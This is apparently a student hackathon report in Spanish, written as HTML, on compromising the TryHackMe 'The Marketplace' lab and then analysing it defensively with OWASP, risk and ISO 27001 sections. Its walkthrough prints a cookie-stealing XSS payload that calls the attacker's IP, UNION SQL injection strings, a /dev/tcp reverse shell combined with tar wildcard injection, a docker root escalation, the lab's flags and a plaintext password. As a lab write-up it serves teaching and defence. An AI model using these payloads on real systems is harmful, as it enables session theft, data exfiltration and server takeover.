@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Informe CyberRisk 2.0 - The Marketplace</title>
+<style>
+  :root{
+    --azul:#0b2545; --azul2:#13315c; --acento:#00b4d8; --rojo:#c1121f; --naranja:#e07a00;
+    --amarillo:#e6b800; --verde:#2a9d8f; --gris:#f4f6fb; --borde:#d7dee8; --texto:#1a1f2b;
+  }
+  *{box-sizing:border-box}
+  body{font-family:"Segoe UI",Arial,sans-serif;color:var(--texto);margin:0;background:#fff;line-height:1.55;font-size:14px}
+  .wrap{max-width:960px;margin:0 auto;padding:0 32px}
+  h1,h2,h3{color:var(--azul);line-height:1.25}
+  h2{border-bottom:3px solid var(--acento);padding-bottom:6px;margin-top:38px;font-size:22px}
+  h3{margin-top:26px;font-size:17px;color:var(--azul2)}
+  a{color:var(--acento)}
+  code{background:#eef2f7;padding:1px 5px;border-radius:4px;font-family:"Consolas",monospace;font-size:12.5px;color:#9a1750}
+  pre{background:#0b2545;color:#e8eef6;padding:12px 14px;border-radius:8px;overflow-x:auto;font-family:"Consolas",monospace;font-size:12.5px;line-height:1.5}
+  pre code{background:none;color:inherit;padding:0}
+  table{border-collapse:collapse;width:100%;margin:14px 0;font-size:12.8px}
+  th,td{border:1px solid var(--borde);padding:7px 9px;text-align:left;vertical-align:top}
+  th{background:var(--azul);color:#fff;font-weight:600}
+  tr:nth-child(even) td{background:var(--gris)}
+  .fig{margin:16px 0;text-align:center}
+  .fig img{max-width:100%;border:1px solid var(--borde);border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.08)}
+  .fig figcaption{font-size:12px;color:#5a6472;margin-top:5px;font-style:italic}
+  .badge{display:inline-block;padding:2px 9px;border-radius:12px;font-size:11px;font-weight:700;color:#fff}
+  .b-crit{background:var(--rojo)} .b-alto{background:#b45f00} .b-medio{background:var(--amarillo);color:#4a3b00} .b-bajo{background:#1f7a6f}
+  .b-ok{background:#1f7a6f} .b-pend{background:#5f6b7d}
+  .flag{background:#06202a;color:#4ee6a8;padding:3px 8px;border-radius:5px;font-family:Consolas,monospace;font-size:12px;display:inline-block}
+  .nota{background:#fff7e6;border-left:4px solid var(--naranja);padding:10px 14px;margin:14px 0;border-radius:4px;font-size:13px}
+  .cover{background:linear-gradient(135deg,var(--azul),var(--azul2));color:#fff;padding:70px 40px;text-align:center;margin-bottom:10px}
+  .cover h1{color:#fff;font-size:34px;margin:0 0 6px}
+  .cover .sub{color:var(--acento);font-size:18px;letter-spacing:1px;font-weight:600}
+  .cover .tag{opacity:.85;margin-top:14px;font-size:13px}
+  .cover .box{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.2);border-radius:10px;padding:18px 24px;display:inline-block;margin-top:26px;text-align:left;font-size:14px}
+  .toc{columns:2;font-size:13px}
+  .toc a{text-decoration:none;color:var(--azul2)}
+  .heat{border-collapse:collapse;margin:10px 0}
+  .heat td,.heat th{border:1px solid #bbb;width:92px;height:58px;text-align:center;vertical-align:middle;font-size:11px;font-weight:600}
+  .h-v{background:#d5f5e3}.h-a{background:#fdebd0}.h-n{background:#fadbd8}.h-r{background:#f1948a}
+  .chip{display:inline-block;background:#fff;border:1px solid #777;border-radius:5px;padding:1px 5px;margin:1px;font-size:11px}
+  .kpi{display:flex;gap:14px;flex-wrap:wrap;margin:16px 0}
+  .kpi .c{flex:1;min-width:150px;background:var(--gris);border:1px solid var(--borde);border-radius:10px;padding:14px;text-align:center}
+  .kpi .n{font-size:26px;font-weight:800;color:var(--azul)}
+  .kpi .l{font-size:11.5px;color:#5a6472;text-transform:uppercase;letter-spacing:.5px}
+  @media print{
+    body{font-size:11.5px}
+    .wrap{max-width:none;padding:0 10mm}
+    h2{page-break-after:avoid} h3{page-break-after:avoid}
+    pre,table,.fig{page-break-inside:avoid}
+    .page-break{page-break-before:always}
+    .cover{min-height:260mm;display:flex;flex-direction:column;justify-content:center}
+    a{color:var(--texto);text-decoration:none}
+  }
+</style>
+</head>
+<body>
+
+<!-- ========== PORTADA ========== -->
+<div class="cover">
+  <div class="sub">HACKATHON DE CIBERSEGURIDAD</div>
+  <h1>CyberRisk 2.0 — The Next Level</h1>
+  <div class="sub">Attack · Detect · Defend</div>
+  <div class="tag">Seguridad de aplicaciones web · OWASP Top 10:2025 · Red Team &amp; Blue Team · ISO/IEC 27001:2022</div>
+  <div class="box">
+    <b>Cliente (ficticio):</b> InnovaSec S.A.S.<br>
+    <b>Consultora / Equipo:</b> <span style="color:#ffd166">[Nombre del equipo]</span><br>
+    <b>Integrantes y roles:</b><br>
+    &nbsp;&nbsp;• <span style="color:#ffd166">[Tu nombre]</span> — Líder Red Team<br>
+    &nbsp;&nbsp;• Andre <span style="color:#ffd166">[Apellido]</span> — Líder Blue Team / Auditor ISO<br>
+    &nbsp;&nbsp;• Wilson <span style="color:#ffd166">[Apellido]</span> — Líder Análisis de Riesgos<br>
+    <b>Asignatura:</b> Ciberseguridad &nbsp;·&nbsp; <b>Docente:</b> [Nombre]<br>
+    <b>Fecha:</b> 14/11/2026 &nbsp;·&nbsp; <b>Nivel alcanzado:</b> Nivel 1 (Reto 1 — The Marketplace)
+  </div>
+</div>
+
+<div class="wrap">
+
+<div class="nota">
+<b>Nota de alcance:</b> este informe documenta el <b>Reto 1 (The Marketplace)</b>, completado al 100% (nivel 1, techo 3.0).
+Los apartados de gestión (OWASP, riesgos, ISO, Blue Team, plan de tratamiento) se desarrollan a partir de los hallazgos de este
+laboratorio. Los retos 2–4 (PHP2Shell, dOOMs Day, Mr-Robot) se indican como <span class="badge b-pend">PENDIENTE</span>.
+Los campos entre <span style="color:#c1121f">[corchetes]</span> deben completarse con los datos del equipo.
+</div>
+
+<!-- KPIs -->
+<div class="kpi">
+  <div class="c"><div class="n">1</div><div class="l">Laboratorio completado</div></div>
+  <div class="c"><div class="n">3/3</div><div class="l">Flags obtenidas</div></div>
+  <div class="c"><div class="n">6</div><div class="l">Hallazgos (H-01a…f)</div></div>
+  <div class="c"><div class="n">root</div><div class="l">Nivel de compromiso</div></div>
+</div>
+
+<!-- TOC -->
+<h2 style="margin-top:20px">Contenido</h2>
+<div class="toc">
+1. Portada · 2. Introducción · 3. Objetivos · 4. Alcance y metodología ·
+5. Herramientas · 6. Desarrollo técnico (The Marketplace) · 7. Informe Red Team ·
+8. Clasificación OWASP 2025 · 9. Análisis Blue Team · 10. Análisis de impacto ·
+11. Matriz de riesgos · 12. Mapa de calor · 13. Controles ISO 27001 ·
+14. Contramedidas · 15. Plan de tratamiento · 16. Aportes adicionales ·
+17. Uso ético de IA · 18. Lecciones aprendidas · 19. Conclusiones · 20. Referencias y anexos
+</div>
+
+<!-- 2 -->
+<h2>2. Introducción</h2>
+<p>InnovaSec S.A.S. es una empresa ficticia de servicios digitales que opera una plataforma de comercio electrónico y
+aplicaciones web empresariales. Ante la detección de configuraciones inseguras y la divulgación de vulnerabilidades críticas
+en entornos PHP (octubre 2026), la dirección contrató a nuestra consultora para una evaluación técnica (Red Team),
+una investigación defensiva (Blue Team) y un análisis de gestión de riesgos basado en estándares.</p>
+<p>El presente informe corresponde al <b>Reto 1: The Marketplace</b>, un escenario que simula una tienda en línea de la
+organización. Se documenta el reconocimiento, la explotación controlada, los hallazgos, su clasificación OWASP Top 10:2025,
+el análisis defensivo, la valoración de riesgos (MAGERIT/INCIBE simplificado), los controles ISO/IEC 27001:2022 y el plan de
+tratamiento.</p>
+
+<!-- 3 -->
+<h2>3. Objetivos</h2>
+<p><b>Objetivo general:</b> evaluar la postura de seguridad de la plataforma de comercio electrónico de InnovaSec S.A.S.
+mediante técnicas ofensivas y defensivas controladas, transformando los hallazgos técnicos en riesgos organizacionales con
+contramedidas basadas en estándares.</p>
+<b>Objetivos específicos:</b>
+<ul>
+<li>Realizar reconocimiento y enumeración de los activos del escenario.</li>
+<li>Identificar y explotar de forma controlada las vulnerabilidades presentes.</li>
+<li>Clasificar los hallazgos según OWASP Top 10:2025.</li>
+<li>Desarrollar el análisis defensivo Blue Team (detección, contención, prevención).</li>
+<li>Valorar y priorizar los riesgos en un mapa de calor.</li>
+<li>Seleccionar controles ISO/IEC 27001:2022 y formular un plan de tratamiento.</li>
+</ul>
+
+<!-- 4 -->
+<h2>4. Alcance y metodología</h2>
+<p><b>Alcance:</b> exclusivamente el laboratorio autorizado <b>TryHackMe – The Marketplace</b>
+(<code>https://tryhackme.com/room/marketplace</code>). No se evaluaron sistemas reales ni de terceros; no se ejecutaron
+ataques de denegación de servicio.</p>
+<p><b>Metodología:</b> enfoque por fases alineado con PTES/OWASP WSTG para la parte ofensiva y análisis de detección para la
+parte defensiva: (1) Reconocimiento y enumeración → (2) Identificación y explotación controlada → (3) Clasificación OWASP →
+(4) Análisis Blue Team → (5) Informe Red Team → (6) Análisis de riesgos → (7) Controles ISO 27001 → (8) Plan de tratamiento.</p>
+<p><b>Datos del entorno:</b> IP objetivo <code>10.64.178.136</code> (reasignada desde <code>10.64.185.69</code> tras un reinicio);
+IP del atacante (VPN tun0) <code>192.168.144.28</code>.</p>
+
+<!-- 5 -->
+<h2>5. Herramientas utilizadas</h2>
+<table>
+<tr><th>Herramienta</th><th>Propósito</th><th>Justificación</th></tr>
+<tr><td>Nmap</td><td>Escaneo de puertos y servicios</td><td>Identificar superficie de ataque (SSH, nginx, app Node.js)</td></tr>
+<tr><td>Navegador + DevTools</td><td>Enumeración web, manipulación de cookies, pruebas XSS</td><td>Inspección del JWT y suplantación de sesión</td></tr>
+<tr><td>Python http.server / netcat</td><td>Listener para exfiltración y shell reversa</td><td>Recibir la cookie del admin y la shell de michael</td></tr>
+<tr><td>sqlmap</td><td>Detección de SQLi</td><td>Prueba automatizada (descartada por filtro 403)</td></tr>
+<tr><td>Inyección UNION manual</td><td>Explotación de la SQLi</td><td>Volcado de la BD evitando el filtro</td></tr>
+<tr><td>SSH</td><td>Acceso remoto como jake</td><td>Uso de credenciales obtenidas</td></tr>
+<tr><td>tar / GTFOBins</td><td>Escalada de privilegios (wildcard injection)</td><td>Abuso de regla sudo sobre script con <code>*</code></td></tr>
+<tr><td>Docker</td><td>Escalada final a root</td><td>Abuso de pertenencia al grupo docker</td></tr>
+</table>
+
+<!-- 6 -->
+<h2 class="page-break">6. Desarrollo técnico — Reto 1: The Marketplace</h2>
+<p><b>Resumen:</b> se comprometió por completo la plataforma encadenando cinco debilidades, pasando de usuario anónimo a
+<b>root</b>: XSS almacenado (robo de sesión admin), SQL Injection (exfiltración de credenciales), credenciales en texto claro,
+configuración sudo insegura + tar wildcard injection, y pertenencia al grupo docker.</p>
+
+<h3>6.1 Fase 1 — Reconocimiento y enumeración</h3>
+<p>Verificación de conectividad con la máquina objetivo a través de la VPN:</p>
+<div class="fig"><img src="evidencias/mk-00-ping.png" alt="ping"><figcaption>Fig. 1 — Conectividad confirmada (TTL 62 = host Linux).</figcaption></div>
+<p>Escaneo de puertos y servicios:</p>
+<pre><code>nmap -sC -sV -p- -T4 -oN nmap-marketplace.txt 10.64.178.136</code></pre>
+<table>
+<tr><th>Puerto</th><th>Servicio</th><th>Versión</th></tr>
+<tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</td></tr>
+<tr><td>80/tcp</td><td>HTTP</td><td>nginx 1.19.2</td></tr>
+<tr><td>32768/tcp</td><td>HTTP</td><td>Node.js (Express) — aplicación <i>The Marketplace</i></td></tr>
+</table>
+<p>El <code>robots.txt</code> expone una entrada denegada (<code>/admin</code>) y en la portada se enumeran dos usuarios
+publicadores: <b>michael</b> y <b>jake</b>.</p>
+<div class="fig"><img src="evidencias/mk-01-nmap-home.png" alt="nmap y home"><figcaption>Fig. 2 — Resultado de nmap (3 puertos) y portada de la aplicación.</figcaption></div>
+<p><b>Análisis de autenticación:</b> la sesión se mantiene con una cookie <code>token</code> (JWT) que <b>no tiene el flag
+<code>HttpOnly</code></b> y cuyo payload expone en claro el campo <code>"admin"</code>:</p>
+<pre><code>{"userId":4,"username":"test","admin":false,"iat":...}</code></pre>
+<div class="fig"><img src="evidencias/mk-02-item.png" alt="item"><figcaption>Fig. 3 — Vista de un anuncio (<code>/item/1</code>): ruta REST basada en path.</figcaption></div>
+
+<h3>6.2 Fase 2 — Explotación controlada</h3>
+
+<p><b>Hallazgo H-01a — XSS almacenado → robo de sesión del administrador.</b> El campo <i>descripción</i> de un anuncio no
+sanitiza HTML/JS. La función <i>"Report listing to admins"</i> hace que el administrador (michael) revise el anuncio,
+ejecutando el script en su navegador.</p>
+<div class="fig"><img src="evidencias/mk-03-item-report.png" alt="report"><figcaption>Fig. 4 — Enlace "Report listing to admins" (gatillo del XSS).</figcaption></div>
+<p>Listener del atacante y payload tipo <i>beacon</i> (no redirige, para poder pulsar "Report"):</p>
+<pre><code>mkdir -p /tmp/xss &amp;&amp; cd /tmp/xss &amp;&amp; python3 -m http.server 8000</code></pre>
+<pre><code>&lt;script&gt;new Image().src='http://192.168.144.28:8000/?c='+document.cookie&lt;/script&gt;</code></pre>
+<p>Tras reportar el anuncio, el listener recibe la cookie del administrador (origen <code>10.64.178.136</code>,
+<code>"admin":true</code>, usuario <b>michael</b>):</p>
+<div class="fig"><img src="evidencias/mk-04-xss-owntoken.png" alt="token"><figcaption>Fig. 5 — Captura de cookies en el listener: token propio (test) y, al reportar, el del administrador.</figcaption></div>
+<p>Se reemplaza la cookie <code>token</code> por el JWT de michael (DevTools → Storage → Cookies) y se recarga: acceso como
+administrador. En <code>/admin</code> ("User listing") se obtiene la <b>primera flag</b> y se enumeran los usuarios del sistema
+(<code>system</code>, <code>michael</code>, <code>jake</code>, <code>test</code>).</p>
+<div class="fig"><img src="evidencias/mk-06-admin-cookie.png" alt="admin cookie"><figcaption>Fig. 6 — Cookie <code>token</code> sin HttpOnly (DevTools) y panel de administración accesible.</figcaption></div>
+<div class="fig"><img src="evidencias/mk-07-flag1.png" alt="flag1"><figcaption>Fig. 7 — <b>FLAG 1</b> en el panel admin: <span class="flag">THM{c37a63895910e478f28669b048c348d5}</span></figcaption></div>
+
+<p><b>Hallazgo H-01b — SQL Injection (UNION, numérica) en <code>/admin?user=</code>.</b> Confirmación manual:
+<code>/admin?user=3-1</code> devuelve a michael (id 2) → el servidor evaluó <code>3-1=2</code> en SQL. Como sqlmap chocaba con
+un filtro que respondía 403, se explotó manualmente con UNION (4 columnas; la columna 2 se refleja como nombre):</p>
+<div class="fig"><img src="evidencias/mk-08-union4.png" alt="union"><figcaption>Fig. 8 — UNION SELECT con 4 columnas: se confirma el canal de salida.</figcaption></div>
+<pre><code># Tablas
+/admin?user=0 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
+# Columnas de 'messages' (0x6d65737361676573 = 'messages')
+/admin?user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name=0x6d65737361676573-- -
+# Volcado de mensajes
+/admin?user=0 UNION SELECT 1,group_concat(id,0x3a,user_from,0x3a,user_to,0x3a,message_content,0x7c),3,4 FROM messages-- -</code></pre>
+<div class="fig"><img src="evidencias/mk-09-tables.png" alt="tablas"><figcaption>Fig. 9 — Tablas de la BD: <code>items, messages, users</code>.</figcaption></div>
+<div class="fig"><img src="evidencias/mk-10-columns.png" alt="columnas"><figcaption>Fig. 10 — Columnas de <code>messages</code>.</figcaption></div>
+<p><b>Hallazgo H-01c — Credenciales en texto claro.</b> El volcado revela un mensaje de <code>system</code> a <b>jake</b> con su
+contraseña SSH: <code>@b_ENXkGYUCAv3zJ</code>.</p>
+<div class="fig"><img src="evidencias/mk-11-messages-jakepass.png" alt="mensajes"><figcaption>Fig. 11 — Mensaje con la contraseña SSH de jake en texto claro.</figcaption></div>
+
+<h3>6.3 Fase 3 — Acceso y escalada de privilegios</h3>
+<p><b>Acceso como jake (FLAG 2):</b></p>
+<pre><code>ssh jake@10.64.178.136        # contraseña: @b_ENXkGYUCAv3zJ
+id                             # uid=1000(jake) groups=1000(jake)  -> NO está en docker
+cat user.txt                   # FLAG 2</code></pre>
+<div class="fig"><img src="evidencias/mk-12-ssh-jake.png" alt="ssh"><figcaption>Fig. 12 — Acceso SSH como jake.</figcaption></div>
+<div class="fig"><img src="evidencias/mk-13-flag2.png" alt="flag2"><figcaption>Fig. 13 — <b>FLAG 2</b> (usuario): <span class="flag">THM{c3648ee7af1369676e3e4b15da6dc0b4}</span></figcaption></div>
+
+<p><b>Hallazgo H-01d — sudo inseguro + tar wildcard injection (jake → michael).</b>
+<code>sudo -l</code> revela que jake puede ejecutar <code>/opt/backups/backup.sh</code> como <b>michael</b> sin contraseña.
+El script ejecuta <code>tar cf /opt/backups/backup.tar *</code>: el comodín <code>*</code> es explotable (GTFOBins).</p>
+<div class="fig"><img src="evidencias/mk-14-sudo-passwd.png" alt="sudo"><figcaption>Fig. 14 — <code>sudo -l</code>: regla NOPASSWD sobre backup.sh; usuarios del sistema.</figcaption></div>
+<div class="fig"><img src="evidencias/mk-15-home-dockersock.png" alt="home"><figcaption>Fig. 15 — Usuarios (jake, michael, marketplace) y socket docker (acceso denegado a jake).</figcaption></div>
+<div class="fig"><img src="evidencias/mk-16-backup-script.png" alt="script"><figcaption>Fig. 16 — Contenido de <code>backup.sh</code>: <code>tar ... *</code> vulnerable.</figcaption></div>
+<pre><code>mkdir -p /tmp/privesc &amp;&amp; cd /tmp/privesc
+echo 'bash -i &gt;&amp; /dev/tcp/192.168.144.28/4445 0&gt;&amp;1' &gt; shell.sh
+echo "" &gt; "--checkpoint=1"
+echo "" &gt; "--checkpoint-action=exec=bash shell.sh"   # bash, no sh (dash falla con &gt;&amp;)
+rm -f /opt/backups/backup.tar
+sudo -u michael /opt/backups/backup.sh                 # dispara exec como michael</code></pre>
+<p>En el listener (<code>nc -lvnp 4445</code>) se recibe una shell de <b>michael</b>, que pertenece al grupo <b>docker</b>
+(<code>groups=...,999(docker)</code>).</p>
+<div class="fig"><img src="evidencias/mk-18-privesc-term.png" alt="privesc"><figcaption>Fig. 17 — Preparación y disparo de la inyección de comodín en tar.</figcaption></div>
+<div class="fig"><img src="evidencias/mk-17-michael-shell.png" alt="michael"><figcaption>Fig. 18 — Shell de michael recibida; pertenece al grupo docker.</figcaption></div>
+
+<p><b>Hallazgo H-01e — Grupo docker (michael → root, FLAG 3).</b> Con la imagen <code>alpine</code> ya presente se monta el
+disco del host y se lee la flag de root como usuario privilegiado del contenedor.</p>
+<pre><code>docker images
+docker run -v /:/mnt --rm alpine cat /mnt/root/root.txt   # FLAG 3</code></pre>
+<div class="fig"><img src="evidencias/mk-19-docker-images.png" alt="imagenes"><figcaption>Fig. 19 — Imágenes docker disponibles (alpine, node, mysql, nginx, themarketplace_marketplace).</figcaption></div>
+<div class="fig"><img src="evidencias/mk-20-root-flag.png" alt="rootflag"><figcaption>Fig. 20 — <b>FLAG 3</b> (root): <span class="flag">THM{d4f76179c80c0dcf46e0f8e43c9abd62}</span></figcaption></div>
+<p><b>Finalización del laboratorio:</b></p>
+<div class="fig"><img src="evidencias/mk-21-room-completed.png" alt="completado"><figcaption>Fig. 21 — Sala "The Marketplace" completada en TryHackMe (Room completed).</figcaption></div>
+
+<!-- 7 -->
+<h2 class="page-break">7. Informe Red Team consolidado</h2>
+<p><b>Resumen ejecutivo:</b> la plataforma de comercio electrónico de InnovaSec S.A.S. presenta debilidades que, encadenadas,
+permiten el compromiso total del servidor (de usuario anónimo a root). La causa raíz combina validación de entrada
+insuficiente (XSS/SQLi), gestión deficiente de credenciales (secretos en texto claro, cookies sin HttpOnly) y configuración
+insegura del sistema (regla sudo peligrosa, grupo docker). Se recomienda tratamiento prioritario.</p>
+<table>
+<tr><th>ID</th><th>Hallazgo</th><th>Severidad</th><th>Impacto principal</th><th>Evidencia</th></tr>
+<tr><td>H-01a</td><td>XSS almacenado → robo de sesión admin</td><td><span class="badge b-crit">Crítico</span></td><td>Suplantación del administrador</td><td>Fig. 4–7</td></tr>
+<tr><td>H-01b</td><td>SQL Injection (UNION) en <code>user</code></td><td><span class="badge b-crit">Crítico</span></td><td>Exfiltración completa de la BD</td><td>Fig. 8–11</td></tr>
+<tr><td>H-01c</td><td>Credenciales en texto claro</td><td><span class="badge b-alto">Alto</span></td><td>Acceso SSH como jake</td><td>Fig. 11</td></tr>
+<tr><td>H-01d</td><td>sudo NOPASSWD + tar wildcard injection</td><td><span class="badge b-alto">Alto</span></td><td>Escalada jake → michael</td><td>Fig. 14–18</td></tr>
+<tr><td>H-01e</td><td>Usuario en grupo docker</td><td><span class="badge b-crit">Crítico</span></td><td>Escalada michael → root</td><td>Fig. 19–20</td></tr>
+</table>
+
+<!-- 8 -->
+<h2>8. Clasificación OWASP Top 10:2025</h2>
+<div class="nota">Verificar los identificadores y denominaciones exactos contra la lista oficial
+(<code>https://top10.owasp.org/2025/</code>); la numeración cambió respecto a 2021. No se fuerzan categorías: cuando aplica
+mejor una referencia CWE, se indica.</div>
+<table>
+<tr><th>ID</th><th>Hallazgo</th><th>Categoría OWASP 2025</th><th>Justificación</th></tr>
+<tr><td>H-01a</td><td>XSS almacenado + cookie sin HttpOnly</td><td>Injection (XSS) + Identification &amp; Authentication Failures</td><td>Entrada no codificada ejecutada en el navegador del admin; sesión robable por falta de <code>HttpOnly</code>.</td></tr>
+<tr><td>H-01b</td><td>SQL Injection</td><td>Injection</td><td>Parámetro <code>user</code> concatenado sin parametrizar; permite UNION y volcado de la BD.</td></tr>
+<tr><td>H-01c</td><td>Credenciales en texto claro</td><td>Cryptographic Failures</td><td>Secreto (contraseña) almacenado/transmitido sin cifrar.</td></tr>
+<tr><td>H-01f</td><td>Acceso a panel admin y lectura de datos ajenos</td><td>Broken Access Control</td><td>Un usuario normal obtiene rol admin y lee mensajes de otros usuarios.</td></tr>
+<tr><td>H-01d</td><td>sudo + tar wildcard</td><td>Security Misconfiguration (CWE-78 / CWE-732)</td><td>Regla sudo sobre script con <code>*</code> y directorio world-writable.</td></tr>
+<tr><td>H-01e</td><td>Grupo docker</td><td>Security Misconfiguration / Broken Access Control (CWE-250)</td><td>Pertenecer al grupo docker equivale a privilegios de root.</td></tr>
+</table>
+
+<!-- 9 -->
+<h2>9. Análisis e investigación Blue Team</h2>
+<p>Para el nivel 1, el análisis defensivo se centra en la detección y mitigación de los hallazgos de Marketplace
+(la investigación dOOMs Day corresponde al nivel 3).</p>
+<p><b>Registros relevantes para la detección:</b> <code>/var/log/nginx/access.log</code> y <code>error.log</code>
+(peticiones con <code>UNION/SELECT</code>, ráfagas de 403, <code>&lt;script&gt;</code> en parámetros), log de la aplicación
+Node.js (errores SQL), <code>/var/log/auth.log</code> (accesos SSH de jake, uso de <code>sudo</code>), <code>auditd</code>
+sobre <code>/opt/backups</code> y el socket <code>docker.sock</code>. Se recomienda centralizarlos en un SIEM.</p>
+<table>
+<tr><th>Hallazgo</th><th>Indicador de ataque (detección)</th><th>Contramedida (mitigación/prevención)</th></tr>
+<tr><td>XSS almacenado</td><td><code>&lt;script&gt;</code> en campos de anuncios; peticiones salientes a IP externa; violaciones de CSP</td><td>Codificación de salida, <b>CSP</b>, cookies <code>HttpOnly</code>+<code>Secure</code>, sanitización</td></tr>
+<tr><td>SQL Injection</td><td>Errores SQL en logs; patrones <code>UNION/SELECT/information_schema</code>; ráfaga de 403</td><td>Consultas parametrizadas/ORM, WAF, mínimo privilegio en BD, validación de entrada</td></tr>
+<tr><td>Credenciales en claro</td><td>Secretos en tablas/mensajes; accesos SSH exitosos tras lectura de BD</td><td>No almacenar secretos en claro; hashing/cifrado; rotación</td></tr>
+<tr><td>tar wildcard / sudo</td><td><code>auditd</code> sobre <code>sudo</code> y <code>/opt/backups</code>; ficheros con nombres <code>--checkpoint*</code></td><td>Rutas absolutas en scripts privilegiados, revisión de reglas sudo, quitar world-writable</td></tr>
+<tr><td>Grupo docker</td><td>Creación de contenedores con <code>-v /</code>; uso del socket <code>docker.sock</code></td><td>Retirar usuarios del grupo docker; docker rootless; mínimo privilegio</td></tr>
+</table>
+
+<!-- 10 -->
+<h2>10. Análisis de impacto (CID)</h2>
+<table>
+<tr><th>Hallazgo</th><th>Confidencialidad</th><th>Integridad</th><th>Disponibilidad</th><th>Consecuencia organizacional</th></tr>
+<tr><td>XSS → sesión admin</td><td>Alto</td><td>Alto</td><td>Bajo</td><td>Suplantación del administrador; manipulación de la plataforma</td></tr>
+<tr><td>SQL Injection</td><td>Alto</td><td>Medio</td><td>Bajo</td><td>Fuga de datos de clientes; incumplimiento legal (protección de datos)</td></tr>
+<tr><td>Credenciales en claro</td><td>Alto</td><td>Medio</td><td>Bajo</td><td>Acceso no autorizado; reutilización de credenciales</td></tr>
+<tr><td>Escalada a root</td><td>Alto</td><td>Alto</td><td>Alto</td><td>Control total del servidor; borrado/alteración de evidencia</td></tr>
+</table>
+
+<!-- 11 -->
+<h2 class="page-break">11. Matriz de riesgos (MAGERIT/INCIBE simplificado)</h2>
+<p><b>Metodología:</b> enfoque simplificado inspirado en MAGERIT (activo → amenaza → vulnerabilidad → valoración
+impacto×probabilidad) con la escala académica de la hackathon. <b>Riesgo = Impacto × Probabilidad</b>.
+Escala 1–4 (Bajo/Medio/Alto/Crítico). Niveles: 1–3 Bajo · 4–6 Medio · 7–11 Alto · 12–16 Crítico.</p>
+<table>
+<tr><th>ID</th><th>Activo</th><th>Amenaza</th><th>Vulnerabilidad</th><th>Imp.</th><th>Prob.</th><th>Riesgo</th><th>Nivel</th></tr>
+<tr><td>R-01</td><td>Aplicación web</td><td>Robo de sesión / acceso no autorizado</td><td>XSS almacenado + cookie sin HttpOnly</td><td>4</td><td>3</td><td>12</td><td><span class="badge b-crit">Crítico</span></td></tr>
+<tr><td>R-02</td><td>Base de datos</td><td>Divulgación de información</td><td>SQL Injection</td><td>4</td><td>3</td><td>12</td><td><span class="badge b-crit">Crítico</span></td></tr>
+<tr><td>R-03</td><td>Servidor (SO)</td><td>Escalada a root</td><td>sudo inseguro + tar wildcard + grupo docker</td><td>4</td><td>2</td><td>8</td><td><span class="badge b-alto">Alto</span></td></tr>
+<tr><td>R-04</td><td>Credenciales de usuarios</td><td>Acceso no autorizado</td><td>Secretos en texto claro</td><td>3</td><td>3</td><td>9</td><td><span class="badge b-alto">Alto</span></td></tr>
+<tr><td>R-05</td><td>Capacidad de detección</td><td>Incidente no detectado</td><td>Registro y monitoreo insuficientes</td><td>3</td><td>3</td><td>9</td><td><span class="badge b-alto">Alto</span></td></tr>
+</table>
+
+<!-- 12 -->
+<h2>12. Mapa de calor</h2>
+<p>Impacto (filas) × Probabilidad (columnas). Cada celda muestra los riesgos que caen en ella.</p>
+<table class="heat">
+<tr><th></th><th>Prob. 1</th><th>Prob. 2</th><th>Prob. 3</th><th>Prob. 4</th></tr>
+<tr><th>Imp. 4</th><td class="h-a"></td><td class="h-a"><span class="chip">R-03 (8)</span></td><td class="h-r"><span class="chip">R-01</span><span class="chip">R-02 (12)</span></td><td class="h-n"></td></tr>
+<tr><th>Imp. 3</th><td class="h-v"></td><td class="h-a"></td><td class="h-a"><span class="chip">R-04</span><span class="chip">R-05 (9)</span></td><td class="h-n"></td></tr>
+<tr><th>Imp. 2</th><td class="h-v"></td><td class="h-v"></td><td class="h-a"></td><td class="h-a"></td></tr>
+<tr><th>Imp. 1</th><td class="h-v"></td><td class="h-v"></td><td class="h-v"></td><td class="h-a"></td></tr>
+</table>
+<p style="font-size:12px">
+<span class="badge b-bajo">Bajo 1–3</span>
+<span class="badge b-medio">Medio 4–6</span>
+<span class="badge b-alto">Alto 7–11</span>
+<span class="badge b-crit">Crítico 12–16</span></p>
+<p><b>Prioridad de tratamiento:</b> R-01 y R-02 (Críticos) → atención inmediata; R-03, R-04 y R-05 (Altos) → corto plazo.</p>
+
+<!-- 13 -->
+<h2>13. Controles ISO/IEC 27001:2022 (Anexo A)</h2>
+<table>
+<tr><th>Riesgo</th><th>Control (ID + nombre)</th><th>Justificación</th></tr>
+<tr><td>R-01 / R-02</td><td>A.8.28 — Codificación segura</td><td>Validación de entrada y codificación de salida previenen XSS y SQLi en el desarrollo.</td></tr>
+<tr><td>R-02</td><td>A.8.8 — Gestión de vulnerabilidades técnicas</td><td>Pruebas de seguridad y corrección de la inyección en el SDLC.</td></tr>
+<tr><td>R-04</td><td>A.5.17 — Información de autenticación</td><td>Prohíbe secretos en claro; exige gestión segura de credenciales.</td></tr>
+<tr><td>R-03</td><td>A.8.2 — Derechos de acceso privilegiado</td><td>Revisión de reglas sudo y membresía del grupo docker (mínimo privilegio).</td></tr>
+<tr><td>R-03</td><td>A.8.9 — Gestión de la configuración</td><td>Hardening del servidor; eliminar directorios world-writable y configuraciones inseguras.</td></tr>
+<tr><td>R-05</td><td>A.8.15 / A.8.16 — Registro y seguimiento</td><td>Configurar, proteger y correlacionar logs para detectar incidentes.</td></tr>
+</table>
+
+<!-- 14 -->
+<h2>14. Contramedidas</h2>
+<table>
+<tr><th>Tipo</th><th>Contramedida</th></tr>
+<tr><td>Técnica</td><td>Consultas parametrizadas/ORM; output encoding + CSP + cookies <code>HttpOnly</code>/<code>Secure</code>; eliminar la regla sudo peligrosa y usar rutas absolutas; retirar usuarios del grupo docker; cifrar/retirar secretos en claro.</td></tr>
+<tr><td>Administrativa</td><td>Política de gestión de accesos privilegiados; estándar de desarrollo seguro; procedimiento de respuesta a incidentes; revisiones periódicas de configuración.</td></tr>
+<tr><td>Organizacional</td><td>Concienciación del equipo de desarrollo; segregación de funciones; designación de responsables de seguridad; auditorías periódicas.</td></tr>
+</table>
+
+<!-- 15 -->
+<h2>15. Plan de tratamiento de riesgos</h2>
+<table>
